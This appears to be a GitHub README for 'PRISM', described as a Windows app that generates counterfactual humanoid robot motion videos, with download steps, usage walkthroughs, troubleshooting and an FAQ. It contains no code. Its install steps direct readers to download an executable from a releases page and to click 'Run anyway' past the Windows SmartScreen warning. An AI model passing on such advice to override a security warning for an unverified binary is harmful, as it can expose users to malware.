# 🎥 PRISM - Realistic Humanoid Motion Videos Made Easy

[![Download PRISM](https://img.shields.io/badge/⬇%20Download%20PRISM-Get%20Started-ff69b4?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Bloommmyboi/PRISM/releases)
[![Latest Release](https://img.shields.io/badge/Latest%20Release-Ready%20to%20Use-brightgreen?style=for-the-badge)](https://github.com/Bloommmyboi/PRISM/releases)

PRISM is a desktop application that turns ordinary humanoid robot motion data into clear, realistic video clips. Instead of hiring a video team or learning animation software, you point PRISM at your motion files, pick a scenario, and press a button. A few minutes later you have a polished video you can review, share with your team, or use to train and test robot behaviours.

This guide walks you through everything from your first download to your first finished video. No programming knowledge is required — if you can install a normal Windows program and click a few buttons, you can use PRISM.

---

## 🌟 What Is PRISM?

PRISM stands for **P**redictive **R**endering of **I**nteractive **S**imulated **M**otion. It was built for researchers, engineers, and product teams who work with humanoid robots — machines that walk, balance, reach, and carry objects — but who need to *see* what happens under many different conditions without running the real robot every single time.

The core idea is simple. You give PRISM a recording of a robot's movement. PRISM then creates new, believable versions of that movement with small changes applied — a different floor surface, a slightly heavier box, a different starting posture, a nudge from the side. These alternative versions are called **counterfactual** videos: "what would have happened if…" clips.

Because these clips are generated automatically, you can make hundreds of them in the time it used to take to film one. That makes it practical to test your robot's behaviour across a huge range of everyday situations.

---

## ✨ What You Can Do With PRISM

- **Generate video variations automatically.** Load one motion recording and produce a whole set of alternative versions in a single batch.
- **Preview results before saving.** Watch each clip in the built-in player, slow it down frame by frame, and keep only the ones you want.
- **Organise your work into projects.** Every project keeps its own source files, generated clips, and settings in one tidy folder.
- **Compare side by side.** Put the original recording next to a generated version to see exactly what changed.
- **Export in common video formats.** Save clips as standard video files that open in any media player and upload to any shared drive.
- **Reuse your favourite setups.** Save a set of variations as a preset so your whole team gets consistent results.
- **Work offline.** Once installed, PRISM does all of its processing on your own computer. Nothing is uploaded anywhere.

---

## 💻 Before You Begin

PRISM runs on Windows. To get smooth results, your computer should meet the following recommended setup:

| Item | Recommended |
| --- | --- |
| Operating system | Windows 10 or Windows 11 (64-bit) |
| Processor | Modern quad-core processor or better |
| Memory | 16 GB RAM or more |
| Graphics | Dedicated graphics card with 4 GB of video memory or more |
| Free disk space | 20 GB, plus extra room for the videos you create |
| Display | 1920 × 1080 or higher |

You do **not** need to install any programming tools, code editors, or extra libraries. Everything PRISM needs comes bundled in the download.

A quick tip before you start: close other heavy applications such as video editors or games while PRISM is generating clips. It will run noticeably faster when it has the computer mostly to itself.

---

## 🚀 Getting Started: Download and Install

1. Open your web browser and go to the official release page:

   **https://github.com/Bloommmyboi/PRISM/releases**

2. Visit this link to download the application. Choose the most recent release shown at the top of the page and save the file to your computer.

3. When the download finishes, locate the file in your **Downloads** folder.

4. Double-click the downloaded file to begin. Windows may show a blue "Windows protected your PC" message the first time you open a new program. If you see it, click **More info**, then click **Run anyway**. This is Windows' standard safety check for software it has not seen before.

5. Follow the on-screen prompts. Accept the default location when asked where to install PRISM, then click **Install**.

6. When installation finishes, a PRISM shortcut appears on your desktop and in your Start menu. Click **Finish**, then open PRISM from the shortcut.

The first launch takes a little longer than usual because PRISM prepares its working files. After that, it opens in a few seconds.

---

## 🖱️ Your First Project in Five Steps

Once PRISM is open, you will see a welcome screen with a large **New Project** button. Here is the whole process, start to finish:

**Step 1 — Create a project.** Click **New Project**. Give it a name you will recognise later, such as "Warehouse Test Week 3". Choose a folder where you want the project saved, then click **Create**.

**Step 2 — Add your motion file.** Drag your motion recording from Windows Explorer into the grey drop area, or click **Browse** and select it. PRISM reads the file and shows a summary: how long the motion is, how many joints are recorded, and how many frames it contains.

**Step 3 — Choose what to change.** In the **Variations** panel you will see a list of adjustable factors such as ground surface, payload weight, starting pose, and external push. Tick the ones you want PRISM to vary. Start with one or two factors while you get comfortable — you can always add more later.

**Step 4 — Set how many clips.** Use the slider to choose how many variations PRISM should generate. Ten to twenty is a good starting point. Very large batches take longer and use more disk space.

**Step 5 — Generate.** Click the big **Generate Videos** button. A progress bar shows how far along the batch is and roughly how much time remains. When it finishes, your clips appear as a grid of thumbnails. Click any thumbnail to play it, and use the checkboxes to mark the ones you want to keep.

To save your selected clips as video files, click **Export Selected** and choose an output folder.

---

## 🎬 Understanding the Main Screens

**Project Hub** is the home base. It lists every project you have created, when you last worked on it, and how many clips it contains. Double-click a project to open it.

**Source View** shows your original recording with playback controls. Use the frame slider underneath to step through the motion one frame at a time.

**Variations Panel** is where all the adjustment factors live. Each factor has a simple slider or dropdown, plus a short description explaining what it does in plain language.

**Results Grid** displays your generated clips as thumbnails. Hover over a thumbnail to see the settings that produced it, which is handy when you want to understand why two clips look different.

**Compare Mode** splits the screen so the original plays on the left and a generated clip plays on the right, both synced to the same moment in time.

---

## ⚙️ Adjusting Settings for Better Results

Open **Settings** from the top-right corner menu. A few options are worth knowing about:

- **Video quality.** Higher quality produces sharper clips but larger files and longer generation times. Medium is a sensible default for everyday review; switch to High for anything you plan to present.
- **Frame rate.** Match this to your source recording if you can. A mismatch makes motion look slightly jerky.
- **Output format.** Standard MP4 files play anywhere. Choose the image-sequence option only if you need individual frames for further editing.
- **Scratch folder.** PRISM uses temporary space while generating. If your main drive is nearly full, point this at a roomier drive.
- **Autosave.** On by default. Leave it on and your project settings are preserved even if the app closes unexpectedly.

---

## 📁 Where Your Files Are Saved

By default, PRISM stores each project inside your Documents folder, under **PRISM Projects**. Inside each project folder you will find:

- `source` — the original motion files you added
- `clips` — every generated video
- `exports` — anything you saved using the Export button
- `project.prism` — the settings file that holds your choices

You can move or copy whole project folders to another drive or share them with a colleague. Opening a shared project folder restores all of its settings and clips automatically.

---

## 🛠️ Troubleshooting Common Problems

**The app will not open.** Restart your computer and try again. If it still fails, check that your graphics driver is up to date — this fixes most launch problems.

**Generation is very slow.** Lower the video quality setting, reduce batch size, and close other applications. Laptop users should also plug in the power adapter, since many laptops slow down on battery.

**A clip looks blurry or distorted.** Make sure the frame rate in Settings matches your source recording. Very short source clips (under two seconds) can also produce unstable results; try a longer recording.

**Export fails with a message about disk space.** Free up room on the drive and try exporting in smaller batches of five or ten clips.

**The progress bar seems stuck.** Large batches pause briefly while PRISM organises files. If nothing changes for more than ten minutes, close the app, reopen the project, and generate a smaller batch.

---

## ❓ Frequently Asked Questions

**Do I need an internet connection to use PRISM?** No. Everything happens on your own computer.

**Will this work on a Mac?** PRISM is built for Windows. On a Mac you would need a Windows environment, which is outside the scope of this guide.

**Can I use my own robot recordings?** Yes, as long as they are in one of the standard motion formats listed in the file picker. PRISM shows a clear message if it cannot read a file.

**How long does a batch take?** Roughly one to three minutes per clip on a machine that meets the recommended setup, depending on length and quality settings.

**Does PRISM change my original files?** Never. Source recordings are only ever read, never modified.

---

## 🔒 Privacy and Safety

PRISM does not send your recordings, videos, or project details anywhere. There is no account to create and no usage tracking. Your work stays in the folders you choose on your own computer.

---

## 📬 Getting Help and Sharing Feedback

Bug reports, feature requests, and questions are all welcome on the repository's Issues page. When reporting a problem, include your Windows version, your graphics card model, and the exact message you saw — that makes it much faster to help you.

For new versions and fixes, keep an eye on **https://github.com/Bloommmyboi/PRISM/releases**. Each release lists what changed so you can decide when to update.

---

## 📄 License

PRISM is released for research and evaluation use. See the LICENSE file in the repository for the full terms.

Keywords: PRISM, counterfactual video generation, humanoid robot, loco-manipulation, robot motion visualization, video generation software, Windows application, motion data, robotics research, CoRL 2026